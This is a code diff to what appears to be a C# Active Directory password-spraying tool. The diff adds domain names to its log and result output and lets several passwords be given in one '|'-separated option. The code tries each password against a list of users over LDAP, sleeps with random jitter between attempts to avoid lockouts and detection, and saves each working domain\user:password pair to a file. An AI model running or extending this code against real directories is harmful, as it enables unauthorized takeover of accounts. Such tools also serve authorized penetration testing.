@@ -118,9 +118,17 @@ namespace A
             var rand = new Random();
 
             var domain = _domainDistinguishedName;
+            string domainName;
 
-            if(!_options.OutsideDomain)
+            if (!_options.OutsideDomain)
+            {
                 domain = $"LDAP://{_domain.Name}/{_domainDistinguishedName}";
+                domainName = _domain.Name;
+            }
+            else
+            {
+                domainName = domain;
+            }
 
             while (_running && !_cancellationToken.IsCancellationRequested)
             {
@@ -131,7 +139,7 @@ namespace A
                         break;
 
                     var timeNow = DateTime.Now;
-                    Verbose( $"[*] Now trying password {password} against {_userList.Count} users. Current time is {timeNow.ToString(GetDateTimeFormat())}", MessageColor.Yellow);
+                    Verbose( $"[*] Now trying password {password} against {_userList.Count} users. Domain '{domainName}'. Current time is {timeNow.ToString(GetDateTimeFormat())}", MessageColor.Yellow);
 
 
                     foreach (var user in _userList)
@@ -144,23 +152,23 @@ namespace A
 
                         attemptMadeCount++;
 
+                        Verbose($"[*] Trying: {domainName}\\{user}:{password}", MessageColor.Blue);
+
                         var isSuccess = AttemptAuth(domain, user, password);
 
                         if (isSuccess)
                         {
                             _validUsers.Add(user);
-                            Messenger.GoodMessage($"[*] SUCCESS! User:{user} Password:{password}");
-                            WriteToFile($"{user}:{password}\n");
+                            Messenger.GoodMessage($"[+] SUCCESS! User: {domainName}\\{user} Password:{password}");
+                            WriteToFile($"{domainName}\\{user}:{password}\n");
                         }
 
                         var delay = GetDelayRandom(_options.DelayBetweenEachAuthAttempt, _options.Jitter, rand);
-
                         Thread.Sleep(delay);
                     }
 
 
                     Verbose($"{attemptMadeCount} attempts were made so far. ", MessageColor.Blue);
-
 
                     if (IsPasswordQueueEmpty())
                     {
@@ -415,9 +423,13 @@ namespace A
 
         private bool InitPassList()
         {
-            if (!string.IsNullOrEmpty(_options.Password) && !string.IsNullOrWhiteSpace(_options.Password))
+            if (!string.IsNullOrEmpty(_options.Password?.Trim()) && !string.IsNullOrWhiteSpace(_options.Password?.Trim()))
             {
-                _passwordQueue.Enqueue(_options.Password.Trim());
+                var list = _options.Password.Trim().Split('|');
+                foreach (var s in list)
+                {
+                    _passwordQueue.Enqueue(s.Trim());
+                }
             }
             else if (!string.IsNullOrEmpty(_options.PasswordListFilePath) && File.Exists(_options.PasswordListFilePath))
             {
